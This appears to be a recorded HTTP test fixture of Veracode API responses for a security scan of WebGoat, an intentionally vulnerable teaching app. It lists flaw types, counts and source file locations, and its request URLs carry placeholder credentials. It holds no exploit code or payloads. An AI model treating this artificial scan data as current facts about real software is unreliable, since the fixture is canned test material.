        scope=\"org.owasp.webgoat.session.DatabaseUtilities\" functionprototype=\"java.sql.Connection
        makeConnection(WebSession)\" functionrelativelocation=\"93\"/>\n<flaw severity=\"2\"
        categoryname=\"J2EE Bad Practices: Direct Management of Connections\" count=\"1\"
        issueid=\"41\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"This call to getConnection() fails to use the J2EE container's
        resource management facilities as required by the J2EE standard.\r\n\r\nRequest
        the connection from the container rather than attempting to access it directly.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/245.html)\r\n\r\n\" note=\"\"
        cweid=\"245\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"7\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"nnp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DatabaseUtilities.java\" line=\"78\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.DatabaseUtilities\" functionprototype=\"java.sql.Connection
        makeConnection(java.lang.String, java.lang.String)\" functionrelativelocation=\"90\"/>\n<flaw
        severity=\"2\" categoryname=\"J2EE Bad Practices: Direct Management of Connections\"
        count=\"1\" issueid=\"26\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"This call to getConnection() fails to use the J2EE container's
        resource management facilities as required by the J2EE standard.\r\n\r\nRequest
        the connection from the container rather than attempting to access it directly.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/245.html)\r\n\r\n\" note=\"\"
        cweid=\"245\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"7\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"nnp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DatabaseUtilities.java\" line=\"97\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.DatabaseUtilities\" functionprototype=\"java.sql.Connection
        makeConnection(void)\" functionrelativelocation=\"72\"/>\n<flaw severity=\"2\"
        categoryname=\"J2EE Bad Practices: Direct Management of Connections\" count=\"1\"
        issueid=\"253\" module=\"WebGoat-5.0-with-jsp.war\" type=\"java.sql.DriverManager.getConnection\"
        description=\"This call to getConnection() fails to use the J2EE container's
        resource management facilities as required by the J2EE standard.\r\n\r\nRequest
        the connection from the container rather than attempting to access it directly.\r\n\r\nReferences:
        \r\nCWE (http://cwe.mitre.org/data/definitions/245.html)\r\n\r\n\" note=\"\"
        cweid=\"245\" remediationeffort=\"2\" exploitLevel=\"0\" categoryid=\"7\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"nnp\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"DatabaseUtilities.java\" line=\"105\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.DatabaseUtilities\" functionprototype=\"java.sql.Connection
        makeConnection(void)\" functionrelativelocation=\"93\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"17\" categoryname=\"Code Quality\" pcirelated=\"false\">\n<desc>\n<para
        text=\"Code quality issues stem from failure to follow good coding practices
        and can lead to unpredictable behavior. These may include but are not limited
        to:\">\n<bulletitem text=\"Neglecting to remove debug code or dead code\"/>\n<bulletitem
        text=\"Improper resource management, such as using a pointer after it has
        been freed\"/>\n<bulletitem text=\"Using the incorrect operator to compare
        objects\"/>\n<bulletitem text=\"Failing to follow an API or framework specification\"/>\n<bulletitem
        text=\"Using a language feature or API in an unintended manner\"/>\n</para>\n<para
        text=\"While code quality flaws are generally less severe than other categories
        and usually are not directly exploitable, they may serve as indicators that
        developers are not following practices that increase the reliability and security
        of an application.  For an attacker, code quality issues may provide an opportunity
        to stress the application in unexpected ways.\"/>\n</desc>\n<recommendations>\n<para
        text=\"The wide variance of code quality issues makes it impractical to generalize
        how these issues should be addressed.  Refer to individual categories for
        specific recommendations. \"/>\n</recommendations>\n<cwe cweid=\"597\" cwename=\"Use
        of Wrong Operator in String Comparison\" pcirelated=\"false\">\n<description>\n<text
        text=\"Using '==' to compare two strings for equality or '!=' for inequality
        actually compares the object references rather than their values.  It is unlikely
        that this reflects the intended application logic.\"/>\n</description>\n<staticflaws>\n<flaw
        severity=\"2\" categoryname=\"Use of Wrong Operator in String Comparison\"
        count=\"1\" issueid=\"176\" module=\"WebGoat-5.0-with-jsp.war\" type=\"span.neq\"
        description=\"Using '==' to compare two strings for equality actually compares
        the object references rather than their values. It is unlikely that this reflects
        the intended application logic.\r\n\r\nUse the equals() method to compare
        strings, not the '==' operator.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/597.html)\r\n\r\n\"
        note=\"\" cweid=\"597\" remediationeffort=\"1\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WeakAuthenticationCookie.java\" line=\"142\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.WeakAuthenticationCookie\" functionprototype=\"java.lang.String
        checkParams(session.WebSession)\" functionrelativelocation=\"70\"/>\n<flaw
        severity=\"2\" categoryname=\"Use of Wrong Operator in String Comparison\"
        count=\"1\" issueid=\"203\" module=\"WebGoat-5.0-with-jsp.war\" type=\"span.neq\"
        description=\"Using '==' to compare two strings for equality actually compares
        the object references rather than their values. It is unlikely that this reflects
        the intended application logic.\r\n\r\nUse the equals() method to compare
        strings, not the '==' operator.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/597.html)\r\n\r\n\"
        note=\"\" cweid=\"597\" remediationeffort=\"1\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"XMLInjection.java\" line=\"280\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.XMLInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"85\"/>\n<flaw
        severity=\"2\" categoryname=\"Use of Wrong Operator in String Comparison\"
        count=\"1\" issueid=\"248\" module=\"WebGoat-5.0-with-jsp.war\" type=\"span.neq\"
        description=\"Using '==' to compare two strings for equality actually compares
        the object references rather than their values. It is unlikely that this reflects
        the intended application logic.\r\n\r\nUse the equals() method to compare
        strings, not the '==' operator.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/597.html)\r\n\r\n\"
        note=\"\" cweid=\"597\" remediationeffort=\"1\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"XMLInjection.java\" line=\"282\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.XMLInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"86\"/>\n<flaw
        severity=\"2\" categoryname=\"Use of Wrong Operator in String Comparison\"
        count=\"1\" issueid=\"164\" module=\"WebGoat-5.0-with-jsp.war\" type=\"span.neq\"
        description=\"Using '==' to compare two strings for equality actually compares
        the object references rather than their values. It is unlikely that this reflects
        the intended application logic.\r\n\r\nUse the equals() method to compare
        strings, not the '==' operator.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/597.html)\r\n\r\n\"
        note=\"\" cweid=\"597\" remediationeffort=\"1\" exploitLevel=\"-1\" categoryid=\"17\"
        pcirelated=\"false\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"XMLInjection.java\" line=\"292\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.XMLInjection\" functionprototype=\"apache.ecs.Element
        createContent(session.WebSession)\" functionrelativelocation=\"93\"/>\n</staticflaws>\n</cwe>\n</category>\n<category
        categoryid=\"12\" categoryname=\"Cryptographic Issues\" pcirelated=\"true\">\n<desc>\n<para
        text=\"Applications commonly use cryptography to implement authentication
        mechanisms and to ensure the confidentiality and integrity of sensitive data,
        both in transit and at rest.  The proper and accurate implementation of cryptography
        is extremely critical to its efficacy.  Configuration or coding mistakes as
        well as incorrect assumptions may negate a large degree of the protection
        it affords, leaving the crypto implementation vulnerable to attack.\"/>\n<para
        text=\"Common cryptographic mistakes include, but are not limited to, selecting
        weak keys or weak cipher modes, unintentionally exposing sensitive cryptographic
        data, using predictable entropy sources, and mismanaging or hard-coding keys.
        \ \"/>\n<para text=\"Developers often make the dangerous assumption that they
        can improve security by designing their own cryptographic algorithm; however,
        one of the basic tenets of cryptography is that any cipher whose effectiveness
        is reliant on the secrecy of the algorithm is fundamentally flawed.  \"/>\n</desc>\n<recommendations>\n<para
        text=\"Select the appropriate type of cryptography for the intended purpose.
        \ Avoid proprietary encryption algorithms as they typically rely on &quot;security
        through obscurity&quot; rather than sound mathematics.  Select key sizes appropriate
        for the data being protected; for high assurance applications, 256-bit symmetric
        keys and 2048-bit asymmetric keys are sufficient.  Follow best practices for
        key storage, and ensure that plaintext data and key material are not inadvertently
        exposed.\"/>\n</recommendations>\n<cwe cweid=\"614\" cwename=\"Sensitive Cookie
        in HTTPS Session Without 'Secure' Attribute\" pcirelated=\"true\">\n<description>\n<text
        text=\"Setting the Secure attribute on an HTTP cookie instructs the web browser
        to send it only over a secure channel, such as an SSL connection.  Issuing
        a cookie without the Secure attribute allows the browser to transmit it over
        unencrypted connections, which are susceptible to eavesdropping.  It is particularly
        important to set the Secure attribute on any cookies containing sensitive
        data, such as authentication information (e.g. &quot;remember me&quot; style
        functionality).\"/>\n</description>\n<staticflaws>\n<flaw severity=\"2\" categoryname=\"Sensitive
        Cookie in HTTPS Session Without 'Secure' Attribute\" count=\"1\" issueid=\"158\"
        module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.addCookie\"
        description=\"This call to javax.servlet.http.HttpServletResponse.addCookie()
        adds a cookie to the HTTP response that does not have the Secure attribute
        set. Failing to set this attribute allows the browser to send the cookie unencrypted
        over an HTTP session.\r\n\r\nSet the Secure attribute for all cookies used
        by HTTPS sessions.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/614.html)
        \r\nWASC (http://webappsec.pbworks.com/Insufficient-Transport-Layer-Protection)\r\n\r\n\"
        note=\"\" cweid=\"614\" remediationeffort=\"1\" exploitLevel=\"0\" categoryid=\"12\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Challenge2Screen.java\" line=\"172\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.Challenge2Screen\" functionprototype=\"apache.ecs.Element
        doStage1(session.WebSession)\" functionrelativelocation=\"94\"/>\n<flaw severity=\"2\"
        categoryname=\"Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\"
        count=\"1\" issueid=\"154\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.addCookie\"
        description=\"This call to javax.servlet.http.HttpServletResponse.addCookie()
        adds a cookie to the HTTP response that does not have the Secure attribute
        set. Failing to set this attribute allows the browser to send the cookie unencrypted
        over an HTTP session.\r\n\r\nSet the Secure attribute for all cookies used
        by HTTPS sessions.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/614.html)
        \r\nWASC (http://webappsec.pbworks.com/Insufficient-Transport-Layer-Protection)\r\n\r\n\"
        note=\"\" cweid=\"614\" remediationeffort=\"1\" exploitLevel=\"0\" categoryid=\"12\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"Challenge2Screen.java\" line=\"193\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.Challenge2Screen\" functionprototype=\"apache.ecs.Element
        doStage2(session.WebSession)\" functionrelativelocation=\"3\"/>\n<flaw severity=\"2\"
        categoryname=\"Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\"
        count=\"1\" issueid=\"159\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.addCookie\"
        description=\"This call to javax.servlet.http.HttpServletResponse.addCookie()
        adds a cookie to the HTTP response that does not have the Secure attribute
        set. Failing to set this attribute allows the browser to send the cookie unencrypted
        over an HTTP session.\r\n\r\nSet the Secure attribute for all cookies used
        by HTTPS sessions.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/614.html)
        \r\nWASC (http://webappsec.pbworks.com/Insufficient-Transport-Layer-Protection)\r\n\r\n\"
        note=\"\" cweid=\"614\" remediationeffort=\"1\" exploitLevel=\"0\" categoryid=\"12\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WeakAuthenticationCookie.java\" line=\"146\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.WeakAuthenticationCookie\" functionprototype=\"java.lang.String
        checkParams(session.WebSession)\" functionrelativelocation=\"89\"/>\n<flaw
        severity=\"2\" categoryname=\"Sensitive Cookie in HTTPS Session Without 'Secure'
        Attribute\" count=\"1\" issueid=\"19\" module=\"WebGoat-5.0-with-jsp.war\"
        type=\"javax.servlet.http.HttpServletResponse.addCookie\" description=\"This
        call to javax.servlet.http.HttpServletResponse.addCookie() adds a cookie to
        the HTTP response that does not have the Secure attribute set. Failing to
        set this attribute allows the browser to send the cookie unencrypted over
        an HTTP session.\r\n\r\nSet the Secure attribute for all cookies used by HTTPS
        sessions.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/614.html)
        \r\nWASC (http://webappsec.pbworks.com/Insufficient-Transport-Layer-Protection)\r\n\r\n\"
        note=\"\" cweid=\"614\" remediationeffort=\"1\" exploitLevel=\"0\" categoryid=\"12\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WeakSessionID.java\" line=\"209\" sourcefilepath=\"org/owasp/webgoat/lessons/\"
        scope=\"org.owasp.webgoat.lessons.WeakSessionID\" functionprototype=\"apache.ecs.Element
        makeLogin(session.WebSession)\" functionrelativelocation=\"8\"/>\n<flaw severity=\"2\"
        categoryname=\"Sensitive Cookie in HTTPS Session Without 'Secure' Attribute\"
        count=\"1\" issueid=\"52\" module=\"WebGoat-5.0-with-jsp.war\" type=\"javax.servlet.http.HttpServletResponse.addCookie\"
        description=\"This call to javax.servlet.http.HttpServletResponse.addCookie()
        adds a cookie to the HTTP response that does not have the Secure attribute
        set. Failing to set this attribute allows the browser to send the cookie unencrypted
        over an HTTP session.\r\n\r\nSet the Secure attribute for all cookies used
        by HTTPS sessions.\r\n\r\nReferences: \r\nCWE (http://cwe.mitre.org/data/definitions/614.html)
        \r\nWASC (http://webappsec.pbworks.com/Insufficient-Transport-Layer-Protection)\r\n\r\n\"
        note=\"\" cweid=\"614\" remediationeffort=\"1\" exploitLevel=\"0\" categoryid=\"12\"
        pcirelated=\"true\" date_first_occurrence=\"2012-02-29 16:13:33 UTC\" remediation_status=\"New\"
        cia_impact=\"pnn\" grace_period_expires=\"\" affects_policy_compliance=\"false\"
        sourcefile=\"WebSession.java\" line=\"335\" sourcefilepath=\"org/owasp/webgoat/session/\"
        scope=\"org.owasp.webgoat.session.WebSession\" functionprototype=\"void eatCookies()\"
        functionrelativelocation=\"79\"/>\n</staticflaws>\n</cwe>\n</category>\n</severity>\n<severity
        level=\"1\"/>\n<severity level=\"0\"/>\n<flaw-status new=\"190\" reopen=\"0\"
        open=\"0\" fixed=\"0\" total=\"190\" not_mitigated=\"190\" sev-1-change=\"0\"
        sev-2-change=\"14\" sev-3-change=\"148\" sev-4-change=\"22\" sev-5-change=\"6\"/>\n</detailedreport>\n"
    http_version: 
  recorded_at: Wed, 06 Jun 2012 16:25:28 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/2.0/summaryreport.do?build_id=44905
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=25463857974C8954780AA750F812AEB4; Path=/; Secure
      - JSESSIONID=6EDFE24528ECA1527F6865FB60E9169B; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Wed, 06 Jun 2012 22:41:58 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <summaryreport xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://www.veracode.com/schema/reports/export/1.0"
        xsi:schemaLocation="https://www.veracode.com/schema/reports/export/1.0 https://analysiscenter.veracode.com/resource/summaryreport.xsd"
        report_format_version="1.1" app_name="WebGoat" app_id="32338" first_build_submitted_date="2012-02-29
        16:17:16 UTC" version="5.0" build_id="44905" submitter="Veracode" platform="Java"
        assurance_level="5" business_criticality="5" generation_date="2012-06-06 22:41:58
        UTC" veracode_level="VL1" total_flaws="190" flaws_not_mitigated="190" teams=""
        life_cycle_stage="External or Beta Testing" planned_deployment_date="" last_update_time="2012-03-01
        15:03:51 UTC" is_latest_build="true" policy_name="Veracode Transitional Very
        High" policy_version="1" policy_compliance_status="Did Not Pass" policy_rules_status="Did
        Not Pass" grace_period_expired="true" scan_overdue="false" any_type_scan_due="2012-03-01
        15:03:50 UTC" business_owner="" business_unit="Not Specified" tags="">

        <static-analysis rating="F" score="59" submitted_date="2012-02-29 16:16:57
        UTC" published_date="2012-03-01 14:26:18 UTC" analysis_size_bytes="3734905">

        <modules>

        <module name="WebGoat-5.0-with-jsp.war" compiler="JAVAC_6" os="Java J2SE 6"
        architecture="JVM" score="59" numflawssev0="0" numflawssev1="0" numflawssev2="14"
        numflawssev3="136" numflawssev4="21" numflawssev5="2"/>

        </modules>

        </static-analysis>

        <dynamic-analysis rating="D" score="89" submitted_date="2012-03-01 14:58:22
        UTC" published_date="2012-03-01 15:03:50 UTC">

        <modules>

        <module name="dynamic_analysis" compiler="Unknown" os="" architecture="" score="89"
        numflawssev0="0" numflawssev1="0" numflawssev2="0" numflawssev3="10" numflawssev4="1"
        numflawssev5="1" target_url="http://10.10.31.202:8080/webgoat"/>

        </modules>

        </dynamic-analysis>

        <manual-analysis rating="D" score="81" submitted_date="2012-03-01 14:59:07
        UTC" published_date="2012-03-01 14:59:14 UTC">

        <cia_adjustment>0</cia_adjustment>

        <modules>

        <module name="manual_analysis" compiler="Unknown" os="" architecture="" score="81"
        numflawssev0="0" numflawssev1="0" numflawssev2="0" numflawssev3="2" numflawssev4="0"
        numflawssev5="3"/>

        </modules>

        </manual-analysis>

        <severity level="5">

        <category categoryname="OS Command Injection" severity="Very High" count="3"/>

        <category categoryname="Other" severity="Very High" count="1"/>

        <category categoryname="Directory Traversal" severity="Very High" count="1"/>

        <category categoryname="Insufficient Input Validation" severity="Very High"
        count="1"/>

        </severity>

        <severity level="4">

        <category categoryname="SQL Injection" severity="High" count="22"/>

        </severity>

        <severity level="3">

        <category categoryname="Cross-Site Scripting (XSS)" severity="Medium" count="127"/>

        <category categoryname="CRLF Injection" severity="Medium" count="6"/>

        <category categoryname="Code Quality" severity="Medium" count="4"/>

        <category categoryname="Directory Traversal" severity="Medium" count="4"/>

        <category categoryname="Credentials Management" severity="Medium" count="2"/>

        <category categoryname="Insufficient Input Validation" severity="Medium" count="2"/>

        <category categoryname="Encapsulation" severity="Medium" count="1"/>

        <category categoryname="Cryptographic Issues" severity="Medium" count="1"/>

        <category categoryname="Race Conditions" severity="Medium" count="1"/>

        </severity>

        <severity level="2">

        <category categoryname="API Abuse" severity="Low" count="5"/>

        <category categoryname="Cryptographic Issues" severity="Low" count="5"/>

        <category categoryname="Code Quality" severity="Low" count="4"/>

        </severity>

        <severity level="1"/>

        <severity level="0"/>

        <flaw-status new="190" reopen="0" open="0" fixed="0" total="190" not_mitigated="190"
        sev-1-change="0" sev-2-change="14" sev-3-change="148" sev-4-change="22" sev-5-change="6"/>

        </summaryreport>

'
    http_version: 
  recorded_at: Wed, 06 Jun 2012 22:41:58 GMT
- request:
    method: get
    uri: https://test:test0@analysiscenter.veracode.com/api/4.0/getappinfo.do?app_id=32338
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=A0033CE0C654E8CD5CE37D5AC09B9AA2; Path=/; Secure
      - JSESSIONID=D1193E4F0EBA5FC9AE3B34AA635CC2D6; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 00:41:38 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <appinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/appinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/appinfo
        https://analysiscenter.veracode.com/resource/2.0/appinfo.xsd" account_id="15834">

        <application app_id="32338" app_name="WebGoat" description="WebGoat is a teaching
        web application illustrating common web vulnerabilities." business_criticality="Very
        High" policy="Veracode Transitional Very High" teams="" origin="Open Source"
        industry_vertical="Other" app_type="Other" deployment_method="Not Specified"
        is_web_application="true" modified_date="2012-03-01T10:03:59-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        </application>

        </appinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 00:41:38 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getbuildinfo.do?app_id=32338&build_id=44905
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=689834BA39FE993454C92F56DABA5B8F; Path=/; Secure
      - JSESSIONID=728A82312AC42990254151DB064AE12B; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 00:41:39 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <buildinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/4.0/buildinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/4.0/buildinfo
        https://analysiscenter.veracode.com/resource/4.0/buildinfo.xsd" account_id="15834"
        app_id="32338" build_id="44905">

        <build version="5.0" build_id="44905" submitter="Veracode" platform="Java"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:18-05:00"
        published_date_sec="1330611978" status="Results Ready"/>

        <analysis_unit analysis_type="Dynamic" published_date="2012-03-01T10:03:50-05:00"
        published_date_sec="1330614230" status="Results Ready"/>

        <analysis_unit analysis_type="Manual" published_date="2012-03-01T09:59:14-05:00"
        published_date_sec="1330613954" status="Results Ready"/>

        </build>

        </buildinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 00:41:40 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getappinfo.do?app_id=32338
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=AC79A79FE8F278628C9413352ABA3EDA; Path=/; Secure
      - JSESSIONID=B4C7CD19AC64B62199ABCDF935E6F329; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 00:48:32 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <appinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/appinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/appinfo
        https://analysiscenter.veracode.com/resource/2.0/appinfo.xsd" account_id="15834">

        <application app_id="32338" app_name="WebGoat" description="WebGoat is a teaching
        web application illustrating common web vulnerabilities." business_criticality="Very
        High" policy="Veracode Transitional Very High" teams="" origin="Open Source"
        industry_vertical="Other" app_type="Other" deployment_method="Not Specified"
        is_web_application="true" modified_date="2012-03-01T10:03:59-05:00" cots="false"
        business_unit="Not Specified" tags="">

        <customfield name="Custom 1" value=""/>

        <customfield name="Custom 2" value=""/>

        <customfield name="Custom 3" value=""/>

        <customfield name="Custom 4" value=""/>

        <customfield name="Custom 5" value=""/>

        </application>

        </appinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 00:48:32 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getbuildinfo.do?app_id=32338&build_id=44905
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=A943D07F8F4AAA47113395890027CD5F; Path=/; Secure
      - JSESSIONID=F9275C069942333505F9D1BB8C2AAC72; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 00:48:34 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <buildinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/4.0/buildinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/4.0/buildinfo
        https://analysiscenter.veracode.com/resource/4.0/buildinfo.xsd" account_id="15834"
        app_id="32338" build_id="44905">

        <build version="5.0" build_id="44905" submitter="Veracode" platform="Java"
        lifecycle_stage="External or Beta Testing" results_ready="true" policy_name="Veracode
        Transitional Very High" policy_version="1" policy_compliance_status="Did Not
        Pass" rules_status="Did Not Pass" grace_period_expired="false" scan_overdue="false">

        <analysis_unit analysis_type="Static" published_date="2012-03-01T09:26:18-05:00"
        published_date_sec="1330611978" status="Results Ready"/>

        <analysis_unit analysis_type="Dynamic" published_date="2012-03-01T10:03:50-05:00"
        published_date_sec="1330614230" status="Results Ready"/>

        <analysis_unit analysis_type="Manual" published_date="2012-03-01T09:59:14-05:00"
        published_date_sec="1330613954" status="Results Ready"/>

        </build>

        </buildinfo>

'
    http_version: 
  recorded_at: Fri, 28 Dec 2012 00:48:34 GMT
- request:
    method: get
    uri: https://test:test@analysiscenter.veracode.com/api/4.0/getappinfo.do?app_id=32338
    body:
      encoding: US-ASCII
      string: ''
    headers: {}
  response:
    status:
      code: 200
      message: OK
    headers:
      Pragma:
      - ''
      Cache-Control:
      - no-store private must-revalidate
      Expires:
      - Thu, 01 Jan 1970 00:00:00 GMT
      Set-Cookie:
      - JSESSIONID=0F9F741C1F9F28C3BA8CC599822F2309; Path=/; Secure
      - JSESSIONID=19EE1A474A6325BEA3E74A568412C8F5; Path=/; Secure
      Content-Type:
      - text/xml
      Transfer-Encoding:
      - chunked
      Date:
      - Fri, 28 Dec 2012 01:19:47 GMT
      Server:
      - Apache
    body:
      encoding: US-ASCII
      string: ! '<?xml version="1.0" encoding="UTF-8"?>


        <appinfo xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns="https://analysiscenter.veracode.com/schema/2.0/appinfo"
        xsi:schemaLocation="https://analysiscenter.veracode.com/schema/2.0/appinfo
        https://analysiscenter.veracode.com/resource/2.0/appinfo.xsd" account_id="15834">

